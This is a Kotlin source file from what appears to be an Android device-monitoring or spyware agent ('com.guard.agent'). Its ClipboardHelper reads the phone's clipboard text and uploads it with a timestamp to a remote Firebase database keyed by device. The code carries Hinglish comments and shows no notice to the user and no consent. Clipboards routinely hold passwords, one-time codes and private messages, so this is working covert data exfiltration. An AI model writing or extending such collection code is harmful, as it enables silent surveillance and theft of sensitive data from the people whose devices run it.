package com.guard.agent.helpers.data

import android.content.ClipboardManager
import android.content.Context
import com.google.firebase.database.FirebaseDatabase
import com.guard.agent.core.Constants
import com.guard.agent.utils.Logger

object ClipboardHelper {

    private const val TAG = "ClipboardHelper"

    /**
     * Current clipboard content push karo.
     * ⚠️ Android 10+ pe sirf foreground app clipboard padh sakti hai.
     */
    fun push(ctx: Context, deviceKey: String) {
        try {
            val cm = ctx.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            if (!cm.hasPrimaryClip()) {
                Logger.w(TAG, "No clipboard content")
                return
            }

            val clip = cm.primaryClip ?: return
            if (clip.itemCount == 0) return

            val text = clip.getItemAt(0).coerceToText(ctx).toString()
            if (text.isBlank()) return

            FirebaseDatabase.getInstance()
                .getReference(Constants.PATH_DEVICES)
                .child(deviceKey).child(Constants.SUB_CLIPBOARD).push()
                .setValue(
                    mapOf(
                        "text" to text,
                        "time" to System.currentTimeMillis()
                    )
                )

            Logger.d(TAG, "Clipboard pushed: ${text.take(30)}...")
        } catch (e: Exception) {
            Logger.e(TAG, "push failed", e)
        }
    }
}
